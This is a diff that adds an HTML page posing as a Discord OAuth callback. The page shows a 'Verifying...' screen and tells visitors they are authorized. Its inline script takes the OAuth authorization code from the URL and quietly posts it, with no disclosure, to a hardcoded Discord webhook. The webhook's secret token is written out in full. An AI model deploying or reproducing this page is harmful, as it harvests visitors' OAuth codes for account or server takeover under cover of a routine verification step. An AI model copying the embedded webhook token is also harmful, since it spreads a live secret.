@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Discord OAuth Callback</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <div class="logo">
+        <svg viewBox="0 0 24 24" width="64" height="64" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
+        </svg>
+      </div>
+      <h1 id="status-title">Verifying...</h1>
+      <div class="loader" id="loader"></div>
+      <p id="status-message">Please wait while we process your authorization</p>
+      <div id="result-container" class="hidden">
+        <p id="result-message"></p>
+        <a href="https://discord.gg/kknFUnFu4j" class="button" id="discord-button">
+          Go back to Discord
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Replace with your Discord webhook URL
+    const webhookURL = "https://discord.com/api/webhooks/1350842811183927336/AY1iteWKktfP0OcUZiFH6yH2vnUvJ82Vbbt7iw-R2NKxg7cezV96Q5Iez9kXwP49u37U";
+
+    // Get URL parameters
+    const params = new URLSearchParams(window.location.search);
+    const code = params.get("code");
+    const error = params.get("error");
+
+    // Elements
+    const statusTitle = document.getElementById('status-title');
+    const statusMessage = document.getElementById('status-message');
+    const loader = document.getElementById('loader');
+    const resultContainer = document.getElementById('result-container');
+    const resultMessage = document.getElementById('result-message');
+    const discordButton = document.getElementById('discord-button');
+
+    // Prepare the embed data
+    let embed = {
+      title: "New User Authorized",
+      fields: [],
+      color: 3066993 // Green color for success
+    };
+
+    if (code) {
+      // Add user ID and auth code to embed fields
+      embed.fields.push({ name: "Authorization Code", value: `\`${code}\``, inline: true });
+      embed.fields.push({ name: "Status", value: "User authorized successfully.", inline: true });
+    } else if (error) {
+      embed.title = "OAuth Error";
+      embed.fields.push({ name: "Error", value: `\`${error}\``, inline: true });
+      embed.color = 15158332; // Red color for error
+    } else {
+      embed.title = "Unknown Error";
+      embed.fields.push({ name: "Error", value: "No code or error in the callback URL.", inline: true });
+      embed.color = 15158332; // Red color for error
+    }
+
+    // Send the embed to the webhook
+    fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ embeds: [embed] })
+    }).then(() => {
+      // Show success message
+      statusTitle.textContent = "Authorization Complete";
+      statusMessage.classList.add('hidden');
+      loader.classList.add('hidden');
+      resultContainer.classList.remove('hidden');
+      resultMessage.textContent = "Thanks! You've been successfully authorized.";
+      resultMessage.classList.add('success');
+    }).catch(err => {
+      // Show error message
+      statusTitle.textContent = "Something went wrong";
+      statusMessage.classList.add('hidden');
+      loader.classList.add('hidden');
+      resultContainer.classList.remove('hidden');
+      resultMessage.textContent = "There was an error processing your authorization.";
+      resultMessage.classList.add('error');
+    });
+  </script>
+</body>
+</html>
